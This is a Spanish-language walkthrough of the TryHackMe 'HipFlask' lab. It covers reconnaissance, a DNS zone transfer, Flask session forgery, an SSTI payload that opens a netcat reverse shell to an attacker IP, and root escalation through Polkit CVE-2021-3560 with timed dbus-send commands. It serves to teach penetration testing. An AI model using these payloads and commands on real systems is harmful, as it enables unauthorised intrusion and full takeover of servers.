# Máquina HipFlask
> Información  obtenida de [TryHackMe - HipFlask](https://tryhackme.com/room/hipflask)

Hip Flask es un tutorial de nivel principiante a intermedio. Su objetivo es proporcionar un análisis en profundidad de los procesos de pensamiento involucrados en atacar un servidor web expuesto que aloja una aplicación personalizada en un contexto de prueba de penetración.

El CVSS (Common Vulnerability Scoring System) es un forma estandarizada de evaluar y juzgar la gravedad de la vulnerabilidad. La puntuación final se ajusta con el tiempo dependiendo de otros factores, como si hay un código de explotación disponible públicamente y si hay parches publicados para la hazaña

## Passive footprinting
Sería el tiempo dedicado a recopilar OSINT (Open-Source Intelligence) sobre el objetivo a partir de su huella en línea. Algunas herramientas útiles durante esta fase son:

- [TheHarvester](https://www.kali.org/tools/theharvester/)
- [Recib-ng](https://www.kali.org/tools/recon-ng/)

## Obtener Información de la máquina

### Escaneo con NMAP
A través de un escaneo con `nmap`, se encuentran 4 puertos abiertos
- Puerto 22 (posiblemente SSH)
- Puerto 53 (posiblemente DNS)
- Puerto 80 (posiblemente WEB)
- Puerto 443 (posiblemente WEB)

Otro escaneo nuevamente con `nmap` mas detallado de los servicios nos muestra que 
- Servicio de OpenSSh 8.2p1, posiblemente usando Ubuntu
- FingerPrint desconocido y manipulado, posiblemente un servicio BIND (Servicio DNS mayormente usado) con version 8.2 o superior (A partir de esta version se puede personalizar el banner)
- Servicio nginx 1.18 en el puerto 80 y 443

### Descubrimiento en servicio WEB
Navegando al IP del objetivo desde un navegador , se obtiene el siguiente mensaje 
```
    Host Name: <MACHINE_IP>, not found.
    This server hosts sites on the hipflasks.thm domain.
```
Esto parece indicar que existe un dominio de `hipflasks.thm` por lo tanto solo tocaría obtener el subdominio o subdominios existentes. Esto se puede realizar mediante fuerza bruta o probando subdominios comunes como `www`. Por lo tanto es necesario obligar a la maquina atacante a resolver cualquier *name server* con el IP de la maquina victima. Esto se puede lograr de dos diferentes formas:

- Editar el archivo /etc/hosts agregando la siguiente linea `<IP VICTIMA> <DOMAIN>`
- Navegar a `about:config` y cambiar la configuración de `network.dns.forceResolve` con la IP de la maquina victima

En este caso los subdominios comunes no parecen funcionar y dado que la opción de fuerza bruta por lo general es dejado como ultima opción. Lo ideal es buscar alternativas entre otros servicios, en este determinado caso podría ser el DNS server.

### Descubrimiento en servicio DNS
Unas de las principales malas configuraciones que se encuentran en los servicios DNS son el habilitar las **Transferencias de Zona** para cualquier equipo remoto. En resumen las **transferencias de zona** son un mecanismo que permite a distintos equipos con servicios DNS compartir sus configuraciones. Esto con el objetivo de otorgar redundancia y mejorar la disponibilidad del servicio de DNS en general. 

Es posible vulnerar una mala configuración de transferencia de zona a través de `dig` con el siguiente comando
``
> `dig axfr hipflasks.thm @<MACHINE_IP>`

A través de la ejecución del anterior comando es posible observar distintos subdominios, el principal de todos ellos es `hipper` es decir que con el siguiente subdominio completo:  `hipper.hipflasks.thm`, es posible acceder a la plataforma web.

### Descubrimiento en servicio WEB 2
Con el subdominio es posible realizar un análisis de vulnerabilidades web con `nikto`
> `nikto --url https://hipper.hipflasks.thm | tee nikto `

Con el subdominio también es posible realizar una enumeración de las rutas , esto es posible con `gobuster`, `feroxbuster` por ejemplo con:
> `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u https://hipper.hipflasks.thm -x py,html,txt -o buster -k`

- El parámetro `-k` sirve para ignorar el certificado auto-firmado de la plataforma web
- El comando `-o` para imprimir el resultado en un archivo en texto llamado `buster`
- El comando `-x` para indicar que también se hará la búsqueda por archivos con las extensiones establecidas

Gracias al análisis de gobuster se puede encontrar que existe la siguiente ruta oculta:
> `https://hipper.hipflasks.thm/main.py`

Esta ruta oculta expone por completo un archivo que esta haciendo uso de Flask (Micro-Framework de python) para la creación de una aplicación web. A través de este archivo es posible exponer otros archivos que se encuentran en la carpeta estática del servicio de nginx por lo tanto el código fuente de la aplicacion es filtrada.

A través de la lectura del código fuente es posible obtener la siguiente información 
- Existe otra ruta oculta para login  (también encontrado por gobuster)
- Ruta de dashboard para usuarios que cuentan con una sesión activa 
- La key para crear sesiones
- El algoritmo para crear sesiones  
- Y mucha información mas que no es relevante para esta determinada maquina.

Con todo esto es posible crear nuestra propia sesión y acceder a la sección del dashboard. 

Una vez accediendo a la sección de Dashboard es posible descubrir que es vulnerable a Server-Side Template injection (SSTI). Existe un *room* de TryHackMe el cual indaga sobre este tipo de vulnerabilidad. se puede encontrar en el siguiente enlace: 
> https://tryhackme.com/room/learnssti


### Realizando la explotación 
En resumen es posible inyectar códigos maliciosos(payloads) que serán ejecutados en el servidor aprovechando que el *nombre de usuario* de sesión no esta siendo manejado adecuadamente. Es posible encontrar varios payloads en el siguiente repositorio. 

> [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/)

la siguiente linea puede ser usada para obtener mas información de la maquina de la victima:

`{{config.__class__.__init__.__globals__['os'].popen('echo ""; id; whoami; echo ""; which nc bash curl wget; echo ""; sestatus 2>&1; aa-status 2>&1; echo ""; cat /etc/*-release; echo""; cat /etc/iptables/*').read()}}`

Con lo actual obtenemos la siguiente información:
- estamos en la cuenta www-data con pocos privilegios
- Tenemos suficiente software útil para realizar fácilmente solicitudes web y crear un shell inverso 
- SeLinux no está instalado. AppArmour si lo esta, y no tenemos permiso para ver el estado, por lo que tendremos que ir a ciegas y esperar que no lo este.
- Esta es una máquina Ubuntu 20.04, 
- Hay un firewall en su lugar (como se esperaba). Bloquea todo el tráfico saliente a cualquier cosa que no sean los puertos TCP 443, 445, 80, 25 o 53 y el puerto UDP 53. 
- Se permiten los paquetes ICMP salientes. No hay reglas de IPv6.

Por lo tanto con esta información se inyectara el siguiente payload para crear una `reverse shell`

`{{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc <IP-ATACANTE> 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read()}}`

Pero antes es necesario crear un proceso en escucha con netcat:

> `sudo netcat -lvnp 443`

Luego que la conexión fue establecida es importante ahora estabilizar el *reverse tcp*, esto puede ser realizado con python. (Tambien es recomendable realizar la room de [Introducción a la Shell](https://tryhackme.com/room/introtoshells) en TryhackMe)

Primero es necesario verificar la existencia del modulo de python en la maquina
> `which python python3`

Si existe entonces podemos usar el siguiente comando para estabilizar el *reverse tcp*
> `python3 -c 'import pty;pty.spawn("/bin/bash")'`

También es necesario: 
- Establecer la variable de entorno TERM `export TERM=xterm`

Todo esto lo que hace es remover el echo de la shell de la maquina atacante, por lo tanto comandos como Ctrl + C y Crtl + Z pueden ser usados ahora sin interrumpir la conexión (Solo se mandaría a segundo plano). 

Por otro lado también se puede controlar el tamaño de la Shell remota, debido a que es normal que en un inicio no se encuentre alineado a nuestra terminal.

Correr en la terminal de la maquina atacante y guardar los valores de **rows** y **columns**
> `stty -a`

Deshabilitar el echo del terminal y devolver el shell remoto al primer plano.
> `stty raw -echo; fg`

Establecer el tamaño de tty
> `stty rows <VALUE> cols <VALUE>`

A partir de Ahora iniciaría la fase de **Escalación de privilegios**

### Escalación de Privilegios 
Revisemos rápidamente el directorio `/etc/apparmor.d` para ver si hay alguna configuración que nos impida enumerar:

El siguiente paso seria observar cualquier paquete el cual no ha sido actualizado
> `apt list --upgradeable`

Desafortunadamente para el cliente, las bibliotecas de polkit no están actualizadas (versión 0.105-26ubuntu1 en lugar de 0.105-26ubuntu1.1). Existe una vulnerabilidad de escalada de privilegios en el módulo de autenticación de Polkit que afecta a Ubuntu 20.04 (CVE-2021-3560). Por lo tanto puede ser usada.

Verificar la existencia del usuario que se trata de introducir
> `id attacker`

Obtener un punto de referencia de cuánto tiempo lleva enviar y procesar un mensaje dbus al daemon de cuentas
> `time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1`

Se necesita tomar el mismo mensaje dbus, enviarlo y luego cortarlo aproximadamente a la mitad de la ejecución.
> `dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!`

A continuación, debemos establecer una contraseña para esta cuenta. Usamos exactamente la misma técnica aquí, pero con un mensaje dbus diferente. Cualquier retraso que funcionó la última vez también debería funcionar aquí
> `dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!`

El hash pertenece a la contraseña de `Expl01ted`, por lo tanto podemos acceder a root de la siguiente forma:
> `su attacker`

y luego usar:
> `sudo -s`
